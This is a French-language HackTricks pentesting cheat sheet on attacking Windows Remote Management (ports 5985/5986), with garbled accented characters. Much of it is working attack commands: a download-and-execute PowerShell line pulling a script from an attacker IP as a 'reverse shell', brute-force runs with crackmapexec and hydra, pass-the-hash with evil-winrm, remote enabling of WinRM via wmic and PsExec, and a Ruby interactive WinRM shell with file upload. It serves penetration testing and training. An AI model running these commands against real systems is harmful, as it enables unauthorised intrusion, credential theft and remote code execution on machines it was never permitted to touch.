# 5985,5986 - Pentesting WinRM

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des pirates exp√©riment√©s et des chasseurs de primes !

**Perspectives de piratage**\
Engagez-vous avec du contenu qui explore le frisson et les d√©fis du piratage

**Actualit√©s de piratage en temps r√©el**\
Restez inform√© du monde du piratage en √©volution rapide gr√¢ce √† des actualit√©s et des informations en temps r√©el

**Derni√®res annonces**\
Restez inform√© des derni√®res primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs pirates d√®s aujourd'hui !

## WinRM

[Windows Remote Management (WinRM)](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx) est mis en avant comme un **protocole de Microsoft** qui permet la **gestion √† distance des syst√®mes Windows** via HTTP(S), en utilisant SOAP dans le processus. Il est fondamentalement aliment√© par WMI, se pr√©sentant comme une interface bas√©e sur HTTP pour les op√©rations WMI.

La pr√©sence de WinRM sur une machine permet une administration √† distance simple via PowerShell, similaire au fonctionnement de SSH pour d'autres syst√®mes d'exploitation. Pour d√©terminer si WinRM est op√©rationnel, il est recommand√© de v√©rifier l'ouverture de ports sp√©cifiques :

* **5985/tcp (HTTP)**
* **5986/tcp (HTTPS)**

Un port ouvert dans la liste ci-dessus signifie que WinRM a √©t√© configur√©, permettant ainsi des tentatives d'initiation d'une session √† distance.

### **Initiation d'une session WinRM**

Pour configurer PowerShell pour WinRM, la cmdlet `Enable-PSRemoting` de Microsoft entre en jeu, configurant l'ordinateur pour accepter des commandes PowerShell √† distance. Avec un acc√®s PowerShell √©lev√©, les commandes suivantes peuvent √™tre ex√©cut√©es pour activer cette fonctionnalit√© et d√©signer tout h√¥te comme digne de confiance :
```powershell
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
Cet approche implique d'ajouter un joker √† la configuration `trustedhosts`, une √©tape qui n√©cessite une consid√©ration prudente en raison de ses implications. Il est √©galement not√© que modifier le type de r√©seau de "Public" √† "Work" pourrait √™tre n√©cessaire sur la machine de l'attaquant.

De plus, WinRM peut √™tre **activ√© √† distance** en utilisant la commande `wmic`, comme d√©montr√© ci-dessous:
```powershell
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
Ce m√©thode permet la configuration √† distance de WinRM, am√©liorant la flexibilit√© dans la gestion des machines Windows √† distance.

### Tester si configur√©

Pour v√©rifier la configuration de votre machine d'attaque, la commande `Test-WSMan` est utilis√©e pour v√©rifier si la cible a correctement configur√© WinRM. En ex√©cutant cette commande, vous devriez vous attendre √† recevoir des d√©tails concernant la version du protocole et wsmid, indiquant une configuration r√©ussie. Voici des exemples illustrant la sortie attendue pour une cible configur√©e par rapport √† une non configur√©e :

* Pour une cible qui **est** correctement configur√©e, la sortie ressemblera √† ceci :
```bash
Test-WSMan <target-ip>
```
La r√©ponse devrait contenir des informations sur la version du protocole et wsmid, signifiant que WinRM est configur√© correctement.

![](<../.gitbook/assets/image (579).png>)

* En revanche, pour une cible **non** configur√©e pour WinRM, cela r√©sulterait en l'absence de ces informations d√©taill√©es, mettant en √©vidence l'absence d'une configuration WinRM appropri√©e.

![](<../.gitbook/assets/image (455).png>)

### Ex√©cuter une commande

Pour ex√©cuter `ipconfig` √† distance sur une machine cible et afficher sa sortie, faire :
```powershell
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../.gitbook/assets/image (148).png>)

Vous pouvez √©galement **ex√©cuter une commande de votre console PS actuelle via** _**Invoke-Command**_. Supposons que vous ayez localement une fonction appel√©e _**enumeration**_ et que vous souhaitiez **l'ex√©cuter sur un ordinateur distant**, vous pouvez le faire :
```powershell
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### Ex√©cuter un script
```powershell
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Obtenir un shell invers√©
```powershell
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### Obtenir une session PS

Pour obtenir un shell PowerShell interactif, utilisez `Enter-PSSession`:
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../.gitbook/assets/image (1006).png>)

**La session s'ex√©cutera dans un nouveau processus (wsmprovhost) √† l'int√©rieur de la "victime"**

### **Forcer l'ouverture de WinRM**

Pour utiliser PS Remoting et WinRM mais si l'ordinateur n'est pas configur√©, vous pourriez l'activer avec :
```powershell
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### Sauvegarde et restauration des sessions

Cela **ne fonctionnera pas** si la **langue** est **restreinte** sur l'ordinateur distant.
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
√Ä l'int√©rieur de ces sessions, vous pouvez charger des scripts PS en utilisant _Invoke-Command_.
```powershell
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### Erreurs

Si vous rencontrez l'erreur suivante :

`enter-pssession : La connexion au serveur distant 10.10.10.175 a √©chou√© avec le message d'erreur suivant : Le client WinRM ne peut pas traiter la requ√™te. Si le sch√©ma d'authentification est diff√©rent de Kerberos, ou si l'ordinateur client n'est pas joint √† un domaine, le transport HTTPS doit √™tre utilis√© ou la machine de destination doit √™tre ajout√©e √† la configuration TrustedHosts. Utilisez winrm.cmd pour configurer TrustedHosts. Notez que les ordinateurs de la liste TrustedHosts peuvent ne pas √™tre authentifi√©s. Vous pouvez obtenir plus d'informations en ex√©cutant la commande suivante : winrm help config. Pour plus d'informations, consultez le sujet d'aide sur le d√©pannage √† distance about_Remote_Troubleshooting.`

Essayez sur le client (informations provenant [ici](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
<figure><img src="../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de bugs !

**Perspectives de Hacking**\
Engagez-vous avec du contenu qui explore les sensations fortes et les d√©fis du hacking

**Actualit√©s de Hacking en Temps R√©el**\
Restez √† jour avec le monde du hacking en constante √©volution gr√¢ce aux actualit√©s et aux informations en temps r√©el

**Derni√®res Annonces**\
Restez inform√© des derni√®res primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

## Connexion WinRM sous linux

### Brute Force

Attention, le force brute sur WinRM pourrait bloquer les utilisateurs.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### Utilisation d'evil-winrm
```ruby
gem install evil-winrm
```
Lisez la **documentation** sur son github : [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
Pour utiliser evil-winrm pour se connecter √† une adresse **IPv6**, cr√©ez une entr√©e √† l'int√©rieur de _**/etc/hosts**_ en d√©finissant un **nom de domaine** pour l'adresse IPv6 et connectez-vous √† ce domaine.

### Transmettre le hachage avec evil-winrm
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
### Utilisation d'une machine PS-docker
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### Utilisation d'un script ruby

**Code extrait d'ici:** [**https://alamot.github.io/winrm\_shell/**](https://alamot.github.io/winrm\_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

* `port:5985 Microsoft-HTTPAPI`

## R√©f√©rences

* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## Commandes Automatiques HackTricks
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‚ÄòMySuperSecr3tPass123!‚Äô

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
‚Äã

<figure><img src="../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de bugs !

**Perspectives de piratage**\
Engagez-vous avec du contenu qui explore le frisson et les d√©fis du piratage

**Actualit√©s de piratage en temps r√©el**\
Restez √† jour avec le monde du piratage en constante √©volution gr√¢ce aux actualit√©s et aux informations en temps r√©el

**Derni√®res annonces**\
Restez inform√© des derni√®res primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
